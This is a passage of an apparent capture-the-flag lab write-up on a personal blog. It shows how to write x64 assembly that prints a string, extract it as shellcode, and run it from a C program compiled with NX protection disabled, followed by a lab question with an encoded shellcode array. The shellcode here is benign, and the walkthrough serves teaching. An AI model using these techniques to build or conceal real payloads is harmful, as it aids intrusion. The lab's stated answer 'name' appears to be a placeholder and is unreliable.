<a id=__codelineno-0-20 name=__codelineno-0-20 href=#__codelineno-0-20></a><span class=w>    </span><span class=nf>call</span><span class=w> </span><span class=no>GOBACK</span><span class=w>       </span><span class=c1>; 2) we are going back, since we used `call`, that means</span>
<a id=__codelineno-0-21 name=__codelineno-0-21 href=#__codelineno-0-21></a><span class=w>                      </span><span class=c1>; the return address, which is, in this case, the address</span>
<a id=__codelineno-0-22 name=__codelineno-0-22 href=#__codelineno-0-22></a><span class=w>                      </span><span class=c1>; of &quot;THM, Rocks!\r\n&quot;, is pushed into the stack.</span>
<a id=__codelineno-0-23 name=__codelineno-0-23 href=#__codelineno-0-23></a><span class=w>    </span><span class=nf>db</span><span class=w> </span><span class=err>&quot;</span><span class=no>THM</span><span class=p>,</span><span class=w> </span><span class=no>Rocks</span><span class=p>!</span><span class=err>&quot;</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=no>dh</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=no>ah</span>
</code></pre></div> <p>Let's explain the ASM code a bit more. First, our message string is stored at the end of the .text section. Since we need a pointer to that message to print it, we will jump to the call instruction before the message itself. When <strong>call GOBACK</strong> is executed, the address of the next instruction after call will be pushed into the stack, which corresponds to where our message is. Note that the 0dh, 0ah at the end of the message is the binary equivalent to a new line (\r\n).</p> <p>Next, the program starts the GOBACK routine and prepares the required registers for our first sys_write() function.</p> <ul> <li>We specify the sys_write function by storing 1 in the rax register.</li> <li>We set rdi to 1 to print out the string to the user's console (STDOUT).</li> <li>We pop a pointer to our string, which was pushed when we called GOBACK and store it into rsi.</li> <li>With the syscall instruction, we execute the sys_write function with the values we prepared.</li> <li>For the next part, we do the same to call the sys_exit function, so we set 0x3c into the rax register and call the syscall function to exit the program.</li> </ul> <p>Next, we compile and link the ASM code to create an x64 Linux executable file and finally execute the program.</p> <div class=highlight><span class=filename>Assembler and link our code</span><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=n>user</span><span class=nv>@AttackBox</span><span class=p>$</span> <span class=n>nasm</span> <span class=o>-f</span> <span class=n>elf64</span> <span class=n>thm</span><span class=p>.</span><span class=n>asm</span>
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a><span class=n>user</span><span class=nv>@AttackBox</span><span class=p>$</span> <span class=n>ld</span> <span class=n>thm</span><span class=p>.</span><span class=n>o</span> <span class=n>-o</span> <span class=n>thm</span>
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=n>user</span><span class=nv>@AttackBox</span><span class=p>$</span> <span class=p>./</span><span class=n>thm</span>
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=n>THM</span><span class=p>,</span><span class=n>Rocks</span><span class=p>!</span>
</code></pre></div> <p>We used the <strong>nasm</strong> command to compile the asm file, specifying the <strong>-f elf64</strong> option to indicate we are compiling for 64-bits Linux. Notice that as a result we obtain a .o file, which contains object code, which needs to be linked in order to be a working executable file. The <strong>ld</strong> command is used to link the object and obtain the final executable. The <strong>-o</strong> option is used to specify the name of the output executable file.</p> <p>Now that we have the compiled ASM program, let's extract the shellcode with the <strong>objdump</strong> command by dumping the .text section of the compiled binary.</p> <div class=highlight><span class=filename>Dump the .text section</span><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=n>user</span><span class=nv>@AttackBox</span><span class=p>$</span> <span class=n>objdump</span> <span class=n>-d</span> <span class=n>thm</span>
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a><span class=n>thm</span><span class=p>:</span>     <span class=n>file</span> <span class=n>format</span> <span class=n>elf64-x86</span><span class=p>-</span><span class=n>64</span>
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a>
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a>
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a><span class=n>Disassembly</span> <span class=n>of</span> <span class=n>section</span> <span class=p>.</span><span class=n>text</span><span class=p>:</span>
<a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a>
<a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a><span class=n>0000000000400080</span> <span class=p>&lt;</span><span class=n>_start</span><span class=p>&gt;:</span>
<a id=__codelineno-2-9 name=__codelineno-2-9 href=#__codelineno-2-9></a>  <span class=n>400080</span><span class=p>:</span>   <span class=n>eb</span> <span class=n>1e</span>                   <span class=n>jmp</span>    <span class=n>4000a0</span> 
<a id=__codelineno-2-10 name=__codelineno-2-10 href=#__codelineno-2-10></a>
<a id=__codelineno-2-11 name=__codelineno-2-11 href=#__codelineno-2-11></a><span class=n>0000000000400082</span> <span class=p>:</span>
<a id=__codelineno-2-12 name=__codelineno-2-12 href=#__codelineno-2-12></a>  <span class=n>400082</span><span class=p>:</span>   <span class=n>b8</span> <span class=n>01</span> <span class=n>00</span> <span class=n>00</span> <span class=n>00</span>          <span class=n>mov</span>    <span class=nv>$0x1</span><span class=p>,</span><span class=k>%</span><span class=n>eax</span>
<a id=__codelineno-2-13 name=__codelineno-2-13 href=#__codelineno-2-13></a>  <span class=n>400087</span><span class=p>:</span>   <span class=n>bf</span> <span class=n>01</span> <span class=n>00</span> <span class=n>00</span> <span class=n>00</span>          <span class=n>mov</span>    <span class=nv>$0x1</span><span class=p>,</span><span class=k>%</span><span class=n>edi</span>
<a id=__codelineno-2-14 name=__codelineno-2-14 href=#__codelineno-2-14></a>  <span class=n>40008c</span><span class=p>:</span>   <span class=n>5e</span>                      <span class=n>pop</span>    <span class=k>%</span><span class=n>rsi</span>
<a id=__codelineno-2-15 name=__codelineno-2-15 href=#__codelineno-2-15></a>  <span class=n>40008d</span><span class=p>:</span>   <span class=n>ba</span> <span class=n>0d</span> <span class=n>00</span> <span class=n>00</span> <span class=n>00</span>          <span class=n>mov</span>    <span class=nv>$0xd</span><span class=p>,</span><span class=k>%</span><span class=n>edx</span>
<a id=__codelineno-2-16 name=__codelineno-2-16 href=#__codelineno-2-16></a>  <span class=n>400092</span><span class=p>:</span>   <span class=n>0f</span> <span class=n>05</span>                   <span class=n>syscall</span> 
<a id=__codelineno-2-17 name=__codelineno-2-17 href=#__codelineno-2-17></a>  <span class=n>400094</span><span class=p>:</span>   <span class=n>b8</span> <span class=n>3c</span> <span class=n>00</span> <span class=n>00</span> <span class=n>00</span>          <span class=n>mov</span>    <span class=nv>$0x3c</span><span class=p>,</span><span class=k>%</span><span class=n>eax</span>
<a id=__codelineno-2-18 name=__codelineno-2-18 href=#__codelineno-2-18></a>  <span class=n>400099</span><span class=p>:</span>   <span class=n>bf</span> <span class=n>00</span> <span class=n>00</span> <span class=n>00</span> <span class=n>00</span>          <span class=n>mov</span>    <span class=nv>$0x0</span><span class=p>,</span><span class=k>%</span><span class=n>edi</span>
<a id=__codelineno-2-19 name=__codelineno-2-19 href=#__codelineno-2-19></a>  <span class=n>40009e</span><span class=p>:</span>   <span class=n>0f</span> <span class=n>05</span>                   <span class=n>syscall</span> 
<a id=__codelineno-2-20 name=__codelineno-2-20 href=#__codelineno-2-20></a>
<a id=__codelineno-2-21 name=__codelineno-2-21 href=#__codelineno-2-21></a><span class=n>00000000004000a0</span> <span class=p>:</span>
<a id=__codelineno-2-22 name=__codelineno-2-22 href=#__codelineno-2-22></a>  <span class=n>4000a0</span><span class=p>:</span>   <span class=n>e8</span> <span class=n>dd</span> <span class=n>ff</span> <span class=n>ff</span> <span class=n>ff</span>          <span class=n>callq</span>  <span class=n>400082</span> 
<a id=__codelineno-2-23 name=__codelineno-2-23 href=#__codelineno-2-23></a>  <span class=n>4000a5</span><span class=p>:</span>   <span class=n>54</span>                      <span class=n>push</span>   <span class=k>%</span><span class=n>rsp</span>
<a id=__codelineno-2-24 name=__codelineno-2-24 href=#__codelineno-2-24></a>  <span class=n>4000a6</span><span class=p>:</span>   <span class=n>48</span>                      <span class=n>rex</span><span class=p>.</span><span class=n>W</span>
<a id=__codelineno-2-25 name=__codelineno-2-25 href=#__codelineno-2-25></a>  <span class=n>4000a7</span><span class=p>:</span>   <span class=n>4d</span> <span class=n>2c</span> <span class=n>20</span>                <span class=n>rex</span><span class=p>.</span><span class=n>WRB</span> <span class=n>sub</span> <span class=nv>$0x20</span><span class=p>,</span><span class=k>%</span><span class=n>al</span>
<a id=__codelineno-2-26 name=__codelineno-2-26 href=#__codelineno-2-26></a>  <span class=n>4000aa</span><span class=p>:</span>   <span class=n>52</span>                      <span class=n>push</span>   <span class=k>%</span><span class=n>rdx</span>
<a id=__codelineno-2-27 name=__codelineno-2-27 href=#__codelineno-2-27></a>  <span class=n>4000ab</span><span class=p>:</span>   <span class=n>6f</span>                      <span class=n>outsl</span>  <span class=k>%</span><span class=n>ds</span><span class=p>:(</span><span class=k>%</span><span class=n>rsi</span><span class=p>),(</span><span class=k>%</span><span class=n>dx</span><span class=p>)</span>
<a id=__codelineno-2-28 name=__codelineno-2-28 href=#__codelineno-2-28></a>  <span class=n>4000ac</span><span class=p>:</span>   <span class=n>63</span> <span class=n>6b</span> <span class=n>73</span>                <span class=n>movslq</span> <span class=n>0x73</span><span class=p>(</span><span class=k>%</span><span class=n>rbx</span><span class=p>),</span><span class=k>%</span><span class=nb>ebp</span>
<a id=__codelineno-2-29 name=__codelineno-2-29 href=#__codelineno-2-29></a>  <span class=n>4000af</span><span class=p>:</span>   <span class=n>21</span>                      <span class=p>.</span><span class=n>byte</span> <span class=n>0x21</span>
<a id=__codelineno-2-30 name=__codelineno-2-30 href=#__codelineno-2-30></a>  <span class=n>4000b0</span><span class=p>:</span>   <span class=n>0d</span>                      <span class=p>.</span><span class=n>byte</span> <span class=n>0xd</span>
<a id=__codelineno-2-31 name=__codelineno-2-31 href=#__codelineno-2-31></a>  <span class=n>4000b1</span><span class=p>:</span>   <span class=n>0a</span>                      <span class=p>.</span><span class=n>byte</span> <span class=n>0xa</span>
</code></pre></div> <p>Now we need to extract the hex value from the above output. To do that, we can use <strong>objcopy</strong> to dump the <strong>.text</strong> section into a new file called <strong>thm.text</strong> in a binary format as follows:</p> <div class=highlight><span class=filename>Extract the .text section</span><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=n>user</span><span class=nv>@AttackBox</span><span class=p>$</span> <span class=n>objcopy</span> <span class=n>-j</span> <span class=p>.</span><span class=n>text</span> <span class=n>-O</span> <span class=n>binary</span> <span class=n>thm</span> <span class=n>thm</span><span class=p>.</span><span class=n>text</span>
</code></pre></div> <p>The thm.text contains our shellcode in binary format, so to be able to use it, we will need to convert it to hex first. The <strong>xxd</strong> command has the <strong>-i</strong> option that will output the binary file in a C string directly:</p> <div class=highlight><span class=filename>Output the hex equivalent to our shellcode</span><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=n>user</span><span class=nv>@AttackBox</span><span class=p>$</span> <span class=n>xxd</span> <span class=n>-i</span> <span class=n>thm</span><span class=p>.</span><span class=n>text</span>
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a><span class=n>unsigned</span> <span class=n>char</span> <span class=n>new_text</span><span class=p>[]</span> <span class=p>=</span> <span class=p>{</span>
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a>  <span class=n>0xeb</span><span class=p>,</span> <span class=n>0x1e</span><span class=p>,</span> <span class=n>0xb8</span><span class=p>,</span> <span class=n>0x01</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0xbf</span><span class=p>,</span> <span class=n>0x01</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span>
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a>  <span class=n>0x5e</span><span class=p>,</span> <span class=n>0xba</span><span class=p>,</span> <span class=n>0x0d</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x0f</span><span class=p>,</span> <span class=n>0x05</span><span class=p>,</span> <span class=n>0xb8</span><span class=p>,</span> <span class=n>0x3c</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span>
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a>  <span class=n>0x00</span><span class=p>,</span> <span class=n>0xbf</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x00</span><span class=p>,</span> <span class=n>0x0f</span><span class=p>,</span> <span class=n>0x05</span><span class=p>,</span> <span class=n>0xe8</span><span class=p>,</span> <span class=n>0xdd</span><span class=p>,</span> <span class=n>0xff</span><span class=p>,</span> <span class=n>0xff</span><span class=p>,</span>
<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a>  <span class=n>0xff</span><span class=p>,</span> <span class=n>0x54</span><span class=p>,</span> <span class=n>0x48</span><span class=p>,</span> <span class=n>0x4d</span><span class=p>,</span> <span class=n>0x2c</span><span class=p>,</span> <span class=n>0x20</span><span class=p>,</span> <span class=n>0x52</span><span class=p>,</span> <span class=n>0x6f</span><span class=p>,</span> <span class=n>0x63</span><span class=p>,</span> <span class=n>0x6b</span><span class=p>,</span> <span class=n>0x73</span><span class=p>,</span> <span class=n>0x21</span><span class=p>,</span>
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a>  <span class=n>0x0d</span><span class=p>,</span> <span class=n>0x0a</span>
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a><span class=p>};</span>
<a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a><span class=n>unsigned</span> <span class=n>int</span> <span class=n>new_text_len</span> <span class=p>=</span> <span class=n>50</span><span class=p>;</span>
</code></pre></div> <p>Finally, we have it, a formatted shellcode from our ASM assembly. That was fun! As we see, dedication and skills are required to generate shellcode for your work!</p> <p>To confirm that the extracted shellcode works as we expected, we can execute our shellcode and inject it into a C program.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdio.h&gt;</span>
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a><span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=n>message</span><span class=p>[]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a><span class=w>        </span><span class=mh>0xeb</span><span class=p>,</span><span class=w> </span><span class=mh>0x1e</span><span class=p>,</span><span class=w> </span><span class=mh>0xb8</span><span class=p>,</span><span class=w> </span><span class=mh>0x01</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0xbf</span><span class=p>,</span><span class=w> </span><span class=mh>0x01</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span>
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a><span class=w>        </span><span class=mh>0x5e</span><span class=p>,</span><span class=w> </span><span class=mh>0xba</span><span class=p>,</span><span class=w> </span><span class=mh>0x0d</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x0f</span><span class=p>,</span><span class=w> </span><span class=mh>0x05</span><span class=p>,</span><span class=w> </span><span class=mh>0xb8</span><span class=p>,</span><span class=w> </span><span class=mh>0x3c</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span>
<a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a><span class=w>        </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0xbf</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x0f</span><span class=p>,</span><span class=w> </span><span class=mh>0x05</span><span class=p>,</span><span class=w> </span><span class=mh>0xe8</span><span class=p>,</span><span class=w> </span><span class=mh>0xdd</span><span class=p>,</span><span class=w> </span><span class=mh>0xff</span><span class=p>,</span><span class=w> </span><span class=mh>0xff</span><span class=p>,</span>
<a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a><span class=w>        </span><span class=mh>0xff</span><span class=p>,</span><span class=w> </span><span class=mh>0x54</span><span class=p>,</span><span class=w> </span><span class=mh>0x48</span><span class=p>,</span><span class=w> </span><span class=mh>0x4d</span><span class=p>,</span><span class=w> </span><span class=mh>0x2c</span><span class=p>,</span><span class=w> </span><span class=mh>0x20</span><span class=p>,</span><span class=w> </span><span class=mh>0x52</span><span class=p>,</span><span class=w> </span><span class=mh>0x6f</span><span class=p>,</span><span class=w> </span><span class=mh>0x63</span><span class=p>,</span><span class=w> </span><span class=mh>0x6b</span><span class=p>,</span><span class=w> </span><span class=mh>0x73</span><span class=p>,</span><span class=w> </span><span class=mh>0x21</span><span class=p>,</span>
<a id=__codelineno-5-9 name=__codelineno-5-9 href=#__codelineno-5-9></a><span class=w>        </span><span class=mh>0x0d</span><span class=p>,</span><span class=w> </span><span class=mh>0x0a</span>
<a id=__codelineno-5-10 name=__codelineno-5-10 href=#__codelineno-5-10></a><span class=w>    </span><span class=p>};</span>
<a id=__codelineno-5-11 name=__codelineno-5-11 href=#__codelineno-5-11></a>
<a id=__codelineno-5-12 name=__codelineno-5-12 href=#__codelineno-5-12></a><span class=w>    </span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>message</span><span class=p>)();</span>
<a id=__codelineno-5-13 name=__codelineno-5-13 href=#__codelineno-5-13></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<a id=__codelineno-5-14 name=__codelineno-5-14 href=#__codelineno-5-14></a><span class=p>}</span>
</code></pre></div> <p>Then, we compile and execute it as follows,</p> <div class=highlight><span class=filename>Compiler our C program</span><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=n>user</span><span class=nv>@AttackBox</span><span class=p>$</span> <span class=n>gcc</span> <span class=n>-g</span> <span class=n>-Wall</span> <span class=n>-z</span> <span class=n>execstack</span> <span class=n>thm</span><span class=p>.</span><span class=n>c</span> <span class=n>-o</span> <span class=n>thmx</span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=n>user</span><span class=nv>@AttackBox</span><span class=p>$</span> <span class=p>./</span><span class=n>thmx</span>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a><span class=n>THM</span><span class=p>,</span><span class=n>Rocks</span><span class=p>!</span>
</code></pre></div> <p>Nice! it works. Note that we compile the C program by disabling the NX protection, which may prevent us from executing the code correctly in the data segment or stack.</p> <p>Understanding shellcodes and how they are created is essential for the following tasks, especially when dealing with encrypting and encoding the shellcode.</p> <details class=question> <summary>Answer the questions bellow</summary> <p>Modify your C program to execute the following shellcode. What is the flag?</p> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a><span class=kt>unsigned</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=n>message</span><span class=p>[]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span>
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a><span class=w>    </span><span class=mh>0xeb</span><span class=p>,</span><span class=w> </span><span class=mh>0x34</span><span class=p>,</span><span class=w> </span><span class=mh>0xb9</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x5e</span><span class=p>,</span><span class=w> </span><span class=mh>0x48</span><span class=p>,</span><span class=w> </span><span class=mh>0x89</span><span class=p>,</span><span class=w> </span><span class=mh>0xf0</span><span class=p>,</span><span class=w> </span><span class=mh>0x80</span><span class=p>,</span>
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a><span class=w>    </span><span class=mh>0x34</span><span class=p>,</span><span class=w> </span><span class=mh>0x08</span><span class=p>,</span><span class=w> </span><span class=mh>0x01</span><span class=p>,</span><span class=w> </span><span class=mh>0x48</span><span class=p>,</span><span class=w> </span><span class=mh>0x83</span><span class=p>,</span><span class=w> </span><span class=mh>0xc1</span><span class=p>,</span><span class=w> </span><span class=mh>0x01</span><span class=p>,</span><span class=w> </span><span class=mh>0x48</span><span class=p>,</span><span class=w> </span><span class=mh>0x83</span><span class=p>,</span><span class=w> </span><span class=mh>0xf9</span><span class=p>,</span><span class=w> </span><span class=mh>0x19</span><span class=p>,</span><span class=w> </span><span class=mh>0x75</span><span class=p>,</span>
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a><span class=w>    </span><span class=mh>0xf2</span><span class=p>,</span><span class=w> </span><span class=mh>0xb8</span><span class=p>,</span><span class=w> </span><span class=mh>0x01</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0xbf</span><span class=p>,</span><span class=w> </span><span class=mh>0x01</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0xba</span><span class=p>,</span>
<a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a><span class=w>    </span><span class=mh>0x19</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x0f</span><span class=p>,</span><span class=w> </span><span class=mh>0x05</span><span class=p>,</span><span class=w> </span><span class=mh>0xb8</span><span class=p>,</span><span class=w> </span><span class=mh>0x3c</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0xbf</span><span class=p>,</span>
<a id=__codelineno-7-6 name=__codelineno-7-6 href=#__codelineno-7-6></a><span class=w>    </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x00</span><span class=p>,</span><span class=w> </span><span class=mh>0x0f</span><span class=p>,</span><span class=w> </span><span class=mh>0x05</span><span class=p>,</span><span class=w> </span><span class=mh>0xe8</span><span class=p>,</span><span class=w> </span><span class=mh>0xc7</span><span class=p>,</span><span class=w> </span><span class=mh>0xff</span><span class=p>,</span><span class=w> </span><span class=mh>0xff</span><span class=p>,</span><span class=w> </span><span class=mh>0xff</span><span class=p>,</span><span class=w> </span><span class=mh>0x55</span><span class=p>,</span>
<a id=__codelineno-7-7 name=__codelineno-7-7 href=#__codelineno-7-7></a><span class=w>    </span><span class=mh>0x49</span><span class=p>,</span><span class=w> </span><span class=mh>0x4c</span><span class=p>,</span><span class=w> </span><span class=mh>0x7a</span><span class=p>,</span><span class=w> </span><span class=mh>0x78</span><span class=p>,</span><span class=w> </span><span class=mh>0x31</span><span class=p>,</span><span class=w> </span><span class=mh>0x74</span><span class=p>,</span><span class=w> </span><span class=mh>0x73</span><span class=p>,</span><span class=w> </span><span class=mh>0x2c</span><span class=p>,</span><span class=w> </span><span class=mh>0x30</span><span class=p>,</span><span class=w> </span><span class=mh>0x72</span><span class=p>,</span><span class=w> </span><span class=mh>0x36</span><span class=p>,</span><span class=w> </span><span class=mh>0x2c</span><span class=p>,</span>
<a id=__codelineno-7-8 name=__codelineno-7-8 href=#__codelineno-7-8></a><span class=w>    </span><span class=mh>0x34</span><span class=p>,</span><span class=w> </span><span class=mh>0x69</span><span class=p>,</span><span class=w> </span><span class=mh>0x32</span><span class=p>,</span><span class=w> </span><span class=mh>0x30</span><span class=p>,</span><span class=w> </span><span class=mh>0x30</span><span class=p>,</span><span class=w> </span><span class=mh>0x62</span><span class=p>,</span><span class=w> </span><span class=mh>0x31</span><span class=p>,</span><span class=w> </span><span class=mh>0x65</span><span class=p>,</span><span class=w> </span><span class=mh>0x32</span><span class=p>,</span><span class=w> </span><span class=mh>0x7c</span><span class=p>,</span><span class=w> </span><span class=mh>0x0d</span><span class=p>,</span><span class=w> </span><span class=mh>0x0a</span>
<a id=__codelineno-7-9 name=__codelineno-7-9 href=#__codelineno-7-9></a><span class=p>};</span>
</code></pre></div> <blockquote> <p>Ans: name</p> </blockquote> </details> <hr> <div class=md-source-file> <small> Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 16, 2023</span> <br> Created: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 16, 2023</span> </small> </div> <!-- Giscus --> <h2 id=__comments>Comments</h2> <!-- Replace with generated snippet --> <script src=https://giscus.app/client.js data-repo=hieuhdh/hieuhdh.github.io data-repo-id=R_kgDOHowGCg data-category=General data-category-id=DIC_kwDOHowGCs4CQLlU data-mapping=pathname data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=preferred_color_scheme data-lang=vi crossorigin=anonymous async>
  </script> <!-- Synchronize Giscus theme with palette --> <script>
    var giscus = document.querySelector("script[src*=giscus]")

    /* Set palette on initial load */
    var palette = __md_get("__palette")
    if (palette && typeof palette.color === "object") {
      var theme = palette.color.scheme === "slate" ? "dark" : "light"
      giscus.setAttribute("data-theme", theme) 
    }

    /* Register event handlers after documented loaded */
    document.addEventListener("DOMContentLoaded", function() {
      var ref = document.querySelector("[data-md-component=palette]")
      ref.addEventListener("change", function() {
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
          var theme = palette.color.scheme === "slate" ? "dark" : "light"

          /* Instruct Giscus to change theme */
          var frame = document.querySelector(".giscus-frame")
          frame.contentWindow.postMessage(
            { giscus: { setConfig: { theme } } },
            "https://giscus.app"
          )
        }
      })
    })
  </script> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </a> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2023 0x5h1n0k0 </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../../..", "features": ["content.code.annotate", "content.tooltips", "navigation.sections", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../../../assets/javascripts/bundle.6c7ad80a.min.js></script> <script src=../../../../assets/javascripts/cursor-effects.js></script> <!-- get ip
        <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
        <script>
            function taskService() {
                this.postListApi = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
